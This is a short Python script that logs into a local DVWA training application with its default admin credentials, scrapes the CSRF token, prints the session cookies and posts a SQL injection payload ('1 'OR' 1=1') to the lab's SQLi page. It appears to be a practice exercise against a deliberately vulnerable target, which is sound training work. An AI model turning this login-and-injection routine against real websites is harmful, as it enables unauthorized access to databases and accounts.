import requests

base = "http://localhost/DVWA"
session = requests.Session()

# Login
login_url = f"{base}/login.php"
r = session.get(login_url)

import re
m = re.search(r"user_token'\s*value='([a-f0-9]+)'", r.text)
if not m:
    raise RuntimeError("user_token not found")
user_token = m.group(1)

session.post(login_url, data={
    "username": "admin",
    "password": "password",
    "user_token": user_token,
    "Login": "Login",
})
print("Cookies:", session.cookies.get_dict())

# SQLi URL
sqli_url = f"{base}/vulnerabilities/sqli/"

page = session.get(sqli_url)
print("SQLi page status:", page.status_code)

r = session.post(sqli_url, data={"id": "1 'OR' 1=1", "Submit": "Submit"})
print(r.text)